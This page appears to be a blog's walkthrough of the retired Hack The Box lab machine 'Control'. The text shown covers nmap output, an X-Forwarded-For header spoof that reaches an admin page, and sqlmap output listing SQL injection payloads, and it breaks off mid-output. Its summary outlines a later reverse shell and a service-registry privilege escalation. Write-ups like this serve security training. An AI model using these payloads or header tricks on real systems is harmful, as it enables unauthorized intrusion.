<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Using X-Forwarded-For to Bypass the Waf , A search product option which leads to a SQLI.After Uploading a shell and executing it to get a Actual powershell shell , And then modifying the Registry of the service to Spawn a shell as admin." /><meta property="og:title" content="Hackthebox Control writeup" /><meta property="og:description" content="Using X-Forwarded-For to Bypass the Waf , A search product option which leads to a SQLI.After Uploading a shell and executing it to get a Actual powershell shell , And then modifying the Registry of the service to Spawn a shell as admin." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/control/control.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Control writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Using X-Forwarded-For to Bypass the Waf , A search product option which leads to a SQLI.After Uploading a shell and executing it to get a Actual powershell shell , And then modifying the Registry of the service to Spawn a shell as admin."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/control/control.png"><title>Hackthebox Control writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Control writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Control writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Feb 18, 2020, 12:00 AM +0800" > Feb 18 <i class="unloaded">2020-02-18T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/control/control.png" class="post-preview-img"><h1 id="informationcontrol">information@control:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Control<tr><td>IP<td>10.10.10.167<tr><td>Points<td>40<tr><td>Os<td>Windows<tr><td>Difficulty<td>Hard<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/31190" target="_blank">TRX</a><tr><td>Out On<td>23 NOV 2019<tr><td>Retired on<td>24 Apr 2020</table></div><h1 id="brief">Brief</h1><p>The Journy of box <strong>Control</strong> starts with <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> to Bypass the Waf , A search product option which leads to a <code class="language-plaintext highlighter-rouge">SQLI</code>.After Uploading a shell and executing it to get a Actual powershell shell , And then modifying the <code class="language-plaintext highlighter-rouge">Registry</code> of the <strong>service</strong> to Spawn a shell as <code class="language-plaintext highlighter-rouge">admin</code>.</p><h1 id="summary">Summary</h1><ul><li>Viewing at source we got an <code class="language-plaintext highlighter-rouge">ip</code><li>Accessing admin panel by using <strong>X-Forwarded-For: header</strong><li>sqli in <code class="language-plaintext highlighter-rouge">search_product.php</code><li>upload file using <strong>sqlmap</strong> and get reverse shell<li>Using plink.exe to forward the winrm port to login as <code class="language-plaintext highlighter-rouge">hector</code><li>Got <strong>User.txt</strong><li>abusing the service <code class="language-plaintext highlighter-rouge">wuauserv</code> by adding <code class="language-plaintext highlighter-rouge">registry</code> with image path of the netcat<li>Got <strong>root.txt</strong></ul><h1 id="nmap">Nmap</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre>Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-02-14 13:55 WIT
Stats: 0:00:19 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 23.25% <span class="k">done</span><span class="p">;</span> ETC: 13:56 <span class="o">(</span>0:00:56 remaining<span class="o">)</span>
Stats: 0:00:57 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 86.00% <span class="k">done</span><span class="p">;</span> ETC: 13:56 <span class="o">(</span>0:00:09 remaining<span class="o">)</span>
Nmap scan report <span class="k">for </span>control.htb <span class="o">(</span>10.10.10.167<span class="o">)</span>
Host is up <span class="o">(</span>0.38s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp  open  msrpc   Microsoft Windows RPC
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, Kerberos, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, oracle-tns: 
|_    Host <span class="s1">'10.10.14.204'</span> is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>2/14%Time<span class="o">=</span>5E4628A3%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>RT
SF:SPRequest,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\</span><span class="s2">
SF:x20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span>%r<span class="o">(</span>RPCC
SF:heck,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20al
SF:lowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersio
SF:nBindReqTCP,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20no
SF:t</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span>%r<span class="o">(</span>DN
SF:SStatusRequestTCP,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is
SF:</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span>
SF:<span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204
SF:'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20
SF:server"</span><span class="o">)</span>%r<span class="o">(</span>TLSSessionReq,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204
SF:'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20
SF:server"</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20
SF:is</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20serve
SF:r"</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">2
SF:0not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span>%r
SF:<span class="o">(</span>FourOhFourRequest,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20i
SF:s</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server
SF:"</span><span class="o">)</span>%r<span class="o">(</span>LPDString,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">2
SF:0not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span>%r
SF:<span class="o">(</span>TerminalServer,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">
SF:20not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span>%
SF:r<span class="o">(</span>NCP,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20a
SF:llowed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span>%r<span class="o">(</span>NotesRPC
SF:,4B,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20allowe
SF:d</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span>%r<span class="o">(</span>WMSRequest,4B
SF:,<span class="s2">"G</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">
SF:20to</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span>%r<span class="o">(</span>oracle-tns,4B,<span class="s2">"G
SF:</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ffj</span><span class="se">\x</span><span class="s2">04Host</span><span class="se">\x</span><span class="s2">20'10</span><span class="se">\.</span><span class="s2">10</span><span class="se">\.</span><span class="s2">14</span><span class="se">\.</span><span class="s2">204'</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20allowed</span><span class="se">\x</span><span class="s2">20t
SF:o</span><span class="se">\x</span><span class="s2">20connect</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20MariaDB</span><span class="se">\x</span><span class="s2">20server"</span><span class="o">)</span><span class="p">;</span>
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>121.09 seconds
</pre></table></code></div></div><p>Three ports <code class="language-plaintext highlighter-rouge">80 http</code> <code class="language-plaintext highlighter-rouge">135 msrpc</code> <code class="language-plaintext highlighter-rouge">3306 mysql</code></p><h2 id="port-80">port 80</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/control/port80.png" alt="alt port-80" /></p><p>There is a admin panel tab too but showing access denied and telling to use proxy <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/control/image-0.png" alt="alt admin.php" /></p><p>Viewing at the source code it has some interesting text in it <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/control/image-1.png" alt="alt admin.php" /></p><p>An ip which is for to enable ssl certificate</p><p>So, The ip we got, is maybe a valid ip that is allowed for accessing admin.php And i tried the same</p><p>i used burp-suite for interception proxy</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/control/image-2.png" alt="alt admin.php" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/control/image-03.png" alt="alt admin.php" /></p><p>And i got the admin panel</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/control/image-05.png" alt="alt admin.php" /></p><p>this was my request</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/admin.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">control.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://control.htb/</span>
<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">x-forwarded-for</span><span class="p">:</span> <span class="s">192.168.4.28</span>
</pre></table></code></div></div><h2 id="sqli">sqli</h2><p>after putting a ‘ in the find products i confirmed the sqli</p><p>i used sqlmap for the sqli saved the http request in <code class="language-plaintext highlighter-rouge">request.txt</code> and ran sqlmap</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre><td class="rouge-code"><pre><span class="nv">$sqlmap</span> <span class="nt">--all</span>  <span class="nt">-r</span> request.txt <span class="nt">--batch</span>
        ___
       __H__
 ___ ___[.]_____ ___ ___  <span class="o">{</span>1.3.11#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[)]</span>     | .<span class="s1">'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 04:01:07 /2020-02-28/

<span class="o">[</span>04:01:07] <span class="o">[</span>INFO] parsing HTTP request from <span class="s1">'request.txt'</span>
<span class="o">[</span>04:01:07] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span> 
<span class="o">[</span>04:01:07] <span class="o">[</span>INFO] testing connection to the target URL
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: productName <span class="o">(</span>POST<span class="o">)</span>
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause <span class="o">(</span>MySQL comment<span class="o">)</span>
    Payload: <span class="nv">productName</span><span class="o">=</span><span class="nt">-1110</span><span class="s1">' OR 7457=7457#

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=1'</span> AND <span class="o">(</span>SELECT 7362 FROM<span class="o">(</span>SELECT COUNT<span class="o">(</span><span class="k">*</span><span class="o">)</span>,CONCAT<span class="o">(</span>0x71627a7871,<span class="o">(</span>SELECT <span class="o">(</span>ELT<span class="o">(</span><span class="nv">7362</span><span class="o">=</span>7362,1<span class="o">)))</span>,0x7170627171,FLOOR<span class="o">(</span>RAND<span class="o">(</span>0<span class="o">)</span><span class="k">*</span>2<span class="o">))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span class="o">)</span>a<span class="o">)</span><span class="nt">--</span> QaIn

